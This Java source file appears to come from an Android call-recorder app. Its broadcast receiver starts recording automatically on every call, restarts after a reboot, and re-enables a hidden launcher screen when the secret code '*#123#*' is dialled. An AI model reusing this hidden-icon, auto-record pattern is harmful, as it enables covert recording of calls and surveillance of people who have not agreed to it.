package com.uttam.callrecord.backuppro.broadcast;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import androidx.core.content.ContextCompat;

import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.uttam.callrecord.backuppro.Constants;
import com.uttam.callrecord.backuppro.PrivacyPolicyActivity;
import com.uttam.callrecord.backuppro.Utils;
import com.uttam.callrecord.backuppro.service.MyForgroundService;
import com.uttam.callrecord.backuppro.service.MyService;

public class MyReceiver extends BroadcastReceiver {

    TelephonyManager telephonyManager;
    PhoneStateListener listener;
    private RecordTimerThread recordTimerThread;
    private int counter=7200;



    @Override
    public void onReceive(final Context context, final Intent intent) {
        if ("android.intent.action.PHONE_STATE".equals(intent.getAction())) {
            telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            listener = new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String incomingNumber) {
                    super.onCallStateChanged(state, incomingNumber);
                    switch (state) {
                        case TelephonyManager.CALL_STATE_IDLE:
                            if (Constants.isRecordStarted) {
                                stopMyService(context);
                            }
                            resetData();
                            break;

                        case TelephonyManager.CALL_STATE_OFFHOOK:
                            Constants.phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                            if (Constants.phoneNumber==null){
                                Constants.phoneNumber="Not Detected";
                            }
                            if (!Constants.isRecordStarted && Constants.phoneNumber != null) {
                                startMyService(context);
                            }
                            Log.d(Constants.TAG,"phone number is "+Constants.phoneNumber);
                            break;


                        case TelephonyManager.CALL_STATE_RINGING:
                            Constants.callIndicator = "incoming";
                            break;
                    }
                }
            };
            telephonyManager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
        }else if ((intent.getAction()!=null) && (intent.getAction().equalsIgnoreCase(Intent.ACTION_BOOT_COMPLETED) || intent.getAction().equalsIgnoreCase(Intent.ACTION_REBOOT) || intent.getAction().equalsIgnoreCase(Intent.ACTION_MY_PACKAGE_REPLACED) || intent.getAction().equalsIgnoreCase("android.intent.action.QUICKBOOT_POWERON") || intent.getAction().equalsIgnoreCase("com.htc.intent.action.QUICKBOOT_POWERON"))){
            registerBroadCastReceiverService(context);
        }

        if (intent.getAction()!=null && intent.getAction().equalsIgnoreCase(Intent.ACTION_NEW_OUTGOING_CALL)){
            String number=intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (number!=null && number.equalsIgnoreCase("*#123#*")){
                PackageManager packageManager=context.getPackageManager();
                ComponentName componentName=new ComponentName(context,PrivacyPolicyActivity.class);
                packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_ENABLED,PackageManager.DONT_KILL_APP);
                Log.d(Constants.TAG,"opening app call detected from broadcast");
            }
        }
    }

    private void resetData() {
        Constants.isRecordStarted = false;
        Constants.callIndicator = "outgoing";
        if (recordTimerThread!=null){
            recordTimerThread.interrupt();
            recordTimerThread=null;
        }
        counter=7200;
    }

    private void startMyService(Context context) {
        if (!Constants.isRecordStarted && Constants.callIndicator != null && Constants.phoneNumber != null && Utils.getBooleanFromStorage(context,Utils.recordStatusKey,false)) {
            Intent intent = new Intent(context, MyService.class);
            intent.putExtra("RecordStart", true);
            intent.putExtra("ServiceStart", true);
            intent.putExtra("PhoneNumber", Constants.phoneNumber);
            intent.putExtra("CallIndicator", Constants.callIndicator);
            ContextCompat.startForegroundService(context, intent);
            Constants.isRecordStarted = true;

            if (recordTimerThread!=null){
                recordTimerThread.interrupt();
                recordTimerThread=null;
            }
            counter=7200;
            recordTimerThread=new RecordTimerThread(context);
            recordTimerThread.start();
        }
    }

    private void stopMyService(Context context) {
        if (Constants.isRecordStarted) {
            Intent intent = new Intent(context, MyService.class);
            intent.putExtra("ServiceStart", false);
            ContextCompat.startForegroundService(context, intent);
            Constants.isRecordStarted = false;
        }
    }

    class RecordTimerThread extends Thread{

        private Context context;

        RecordTimerThread(Context context) {
            this.context = context;
        }

        @Override
        public void run() {
            counter=0;
            while (counter<=7200){
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                counter++;
            }
            stopMyService(context);
            resetData();
        }
    }

    private void registerBroadCastReceiverService(Context context) {
        Intent intent=new Intent(context, MyForgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        }else {
            context.startService(intent);
        }
    }
}
